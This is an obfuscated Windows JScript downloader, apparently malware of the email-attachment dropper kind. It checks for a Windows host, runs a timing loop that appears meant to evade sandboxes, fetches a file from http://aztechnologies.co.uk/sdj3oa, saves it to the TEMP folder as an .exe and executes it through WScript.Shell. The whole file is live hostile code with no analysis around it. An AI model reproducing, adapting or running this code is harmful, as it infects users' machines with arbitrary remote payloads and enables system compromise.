var f = false;
var R = "CreateObject";
var I = function t() {return WScript[R]("WScript.Shell");}(), U = 11;
var M = "MSXML2.XMLHTTP";
var o = 2123213;
var JD = 0;
function lF(ww){I["Run"](ww, JD, JD);};
function TA(){return "" + M;};
function k(NJ, j){JD = JD * 1; return NJ - j;};
function kQ(){return R;};
/*@cc_on
  @if (@_win32 || @_win64)
    f = true;
  @end
@*/
if (f)
{
var N = "";
function jP(){return 22;};
var T = 0; var Y = 0;
function kI()
{
var X1 = new this["Date"]();
var O = X1["getUTCMilliseconds"]();
WScript["Sleep"](jP());
var X1 = new this["Date"]();
var x = X1["getUTCMilliseconds"]();
WScript["Sleep"](jP());
var X1 = new this["Date"]();
var C = X1["getUTCMilliseconds"]();
var T = "X0";
T = k(x, O);
var Y = "Z";
Y = k(C, x);
N = "open";
return k(T, Y);
}
var B = false;
var jc = false;
for (var J = JD; J < jP() * 1; J++){if (kI() != JD){
B = true; 
Y = "31" + 11 * T + Y; 
jc = true; 
break;
}}
function E() {return ((B == true) && (B == jc)) ? 1 : JD;};
if (B && E() && jc){
function dF() {return I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "uCQPgBy75cDCyF.exe";};
 J0 = TA();
 x0 = WScript[R](J0);
 var X = 1;
 while (X){
try {
x0[N]("GET", "http://aztechnologies.co.uk/sdj3oa", false);
x0["send"]();
Qp = "Sleep";
for (;;){WScript[Qp](jP() * 11); if (x0["readystate"] >= 2 * 2) break;};
X = JD;
} catch(L){};
}
function dC(xK) {var q = (1, 2, 3, 4, 5, xK); return q;};
P = WScript[kQ()]("ADODB.Stream");
J0 = P;
J0[N]();
J0["type"] = dC(1);
J0["write"](x0["ResponseBody"]);
P["position"] = dC(JD);
J0["Save" + "ToFile"](dF(), 2);
P["c"+"lose"]();
D = dF();
lF(D);
}
}

